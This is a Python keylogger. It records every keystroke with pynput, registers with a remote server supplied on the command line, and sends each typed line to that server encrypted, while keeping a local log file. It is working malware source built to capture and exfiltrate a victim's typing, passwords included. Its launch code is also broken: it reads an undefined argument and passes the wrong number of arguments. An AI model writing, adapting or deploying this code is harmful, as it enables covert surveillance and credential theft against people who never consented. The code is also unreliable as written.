import time
import argparse
import requests
import uuid
import json
import os

try:
    from pynput import keyboard as kb
    from cryptography.fernet import Fernet
except:  # noqa: E722
    import subprocess
    import sys
    subprocess.check_call([sys.executable, "-m", "pip", "install", "pynput"])
    subprocess.check_call([sys.executable, "-m", "pip", "install", "cryptography"])
    from pynput import keyboard as kb
    from cryptography.fernet import Fernet

class KeyLogger:
    
    def __init__(self, host: str = None):
        
        self.id = str(uuid.uuid4())
        self.encrytion = Fernet.generate_key()
        self.host = host
        self.server_connection = False 
        self.establish_connection()
        
        self.path = self.id + ".txt"
        self.values = ""
        self.last_press = 0
        self.listener = kb.Listener(on_press=self.on_press)
        self.listener.start()
    
    def establish_connection(self):
        if self.host is not None:                                                                                                                                                                                                            
            response = requests.get(self.host)
            
            if response.status_code == 200:
                key = response.json()['data']
                data = {
                    "id": self.id,
                    "encrytion_key": self.encrytion.decode('utf-8') 
                }
                encrypted_data = {
                    "data": self.cipher(data, key)
                }
                response = requests.post(self.host+"/register", json=encrypted_data)
                self.server_connection = True 
                
            else:
                raise Exception("host error")
        
    
    def cipher(self, data: str, key: str = None,  encrypt: bool = True) -> str:
        
        key = key.encode('utf-8') if key else self.encrytion
        cipher_suite = Fernet(key)
        
        if encrypt:
        # Encrypt the token using the Fernet cipher suite
            data = json.dumps(data)
            encrypted_token = cipher_suite.encrypt(data.encode('utf-8'))
            return encrypted_token.decode('utf-8')
        else:
            # Decrypt the token using the Fernet cipher suite
            encrypted_token = cipher_suite.decrypt(data.encode('utf-8'))
            data = json.loads(encrypted_token.decode('utf-8'))
            return data
    
    def send_value(self):
        
        if not self.server_connection:
            self.establish_connection()
            if not self.server_connection:
                return
        
        if len(self.values) > 0:
            data = {
                "id": self.id,
                "word": self.values,
                "timestamp": time.time(),
            }
            encryp = self.cipher(data)
            encrypted_data = {
                "data": encryp + f"?{self.id}"
            }
            response = requests.post(self.host+"log/", json= encrypted_data)
            
            if response.status_code != 200:
                print("The process is over")
                self.kill()
        
        self.values = ""
    
    def delete_value(self, Waiting_time = 5):
        actual_press = time.time()
        if actual_press - self.last_press < Waiting_time:
            self.values = self.values[:-1]
            self.last_press = actual_press
    
    def kill(self):
        
        self.listener.stop()
        os.remove(self.path)
        
        if self.host is not None:
            requests.post(self.host+"stop/", json={"stop": "stop"})

    
    def on_press(self, key):
        
        with open(self.path, "a") as file:
            try:
                char = key.char
                self.values += char
                self.last_press = time.time()
                
            except:  # noqa: E722
                name = key.name
                if name == "space":
                    self.values += " "
                    file.write(" ")
                
                if name == "tab":
                    file.write("\t")
                    self.values += "\t"
                
                if name == "backspace":
                    self.delete_value()
                    
                if name == "enter":      
                    file.write(self.values+"\n")
                    self.send_value()
                    
            file.close()


if __name__ == "__main__":
    
    parser = argparse.ArgumentParser()
    parser.add_argument('--host', type=str, required=True, help='URL of the website')
    args = parser.parse_args()
    host = args.host
    encrytion = args.encrytion
    KeyLogger(host, encrytion)
